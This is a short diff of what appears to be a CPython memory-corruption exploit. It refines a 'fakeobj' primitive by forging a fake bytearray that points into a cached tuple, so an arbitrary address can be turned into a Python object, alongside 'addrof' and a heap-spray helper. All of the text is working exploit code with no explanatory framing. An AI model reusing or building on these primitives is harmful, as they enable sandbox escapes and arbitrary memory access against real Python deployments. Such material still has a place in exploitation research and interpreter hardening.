@@ -138,29 +138,32 @@ def fakeobj_once(addr):
 	return magic
 
 reusable_tuple = (None,)
-reusable_bytesarray = None
+reusable_bytearray = None
 def fakeobj(addr):
 	"""
 	fakeobj_once() does a heap spray each time, which may fail probabilistically and/or OOM.
-	so, we use it once to set up a more repeatable fakeobj primitive (via overlapping bytesarray and tuple)
-	which we can cache and reuse for future fakeobj() invocations.
+	so, we use it once to set up a more repeatable fakeobj primitive which we can
+	cache and reuse for future fakeobj() invocations.
+
+	reusable_bytearray is a fake bytearray that points into the first entry of
+	reusable_tuple, allowing us to freely modify the object it points to.
 	"""
 
-	global reusable_bytesarray
-	if reusable_bytesarray is None:
+	global reusable_bytearray
+	if reusable_bytearray is None:
 		fake_bytearray = bytes(p64a(
 			1,
 			addrof(bytearray),
-			sizeof(reusable_tuple),
-			sizeof(reusable_tuple),
-			addrof(reusable_tuple),
-			addrof(reusable_tuple),
+			8,
+			8,
+			addrof(reusable_tuple) + TUPLE_HEADER_LEN ,
+			addrof(reusable_tuple) + TUPLE_HEADER_LEN,
 			0
 		))
-		reusable_bytesarray = fakeobj_once(refbytes(fake_bytearray))
+		reusable_bytearray = fakeobj_once(refbytes(fake_bytearray))
 
 	# assume 64-bit ptrs
-	reusable_bytesarray[TUPLE_HEADER_LEN:TUPLE_HEADER_LEN+8] = p64a(addr)
+	reusable_bytearray[:8] = p64a(addr)
 
 	res = reusable_tuple[0]
 	nogc.append(res) # unnecessary?
